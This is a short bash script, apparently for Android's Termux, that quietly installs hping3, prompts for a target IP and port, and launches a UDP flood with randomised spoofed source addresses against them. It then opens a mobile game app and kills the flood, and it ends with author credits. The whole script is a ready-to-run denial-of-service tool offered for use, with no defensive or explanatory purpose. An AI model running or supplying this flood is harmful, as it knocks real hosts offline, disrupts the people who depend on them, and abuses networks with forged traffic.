RED='\e[31;1m'
GREEN='\e[32;1m'
YELLOW='\e[33;1m'
STOP='\e[m'
Dependencies()
{
pkg update -y && pkg upgrade -y && pkg install root-repo -y && pkg install hping3 -y
}
Dependencies &>/dev/null
clear
echo -en "\n $GREEN Enter Vulnerable IP : $STOP"
read udpip
sleep 0.75
echo -en "\n $GREEN Enter Vulnerable Port : $STOP"
read port
echo -en "\n $RED Attack Initiated Use CtrL + p To pause the attack $STOP "
sleep 0.55
sudo hping3 -2 --flood --rand-source $udpip -p $port --tcp-timestamp &>/dev/null
sleep 0.65
echo -en "\n $YELLOW STOPPED AND TRASHED CLEARED $STOP "
su -c am start -n com.tencent.ig/com.epicgames.ue4.SplashActivity &>/dev/null
su -c killall hping3
echo -e "\n $RED BY :- SID - NWO $STOP "
sleep .75
echo -e "\n $YELLOW MADE BY SID leetcode $STOP "
exit 0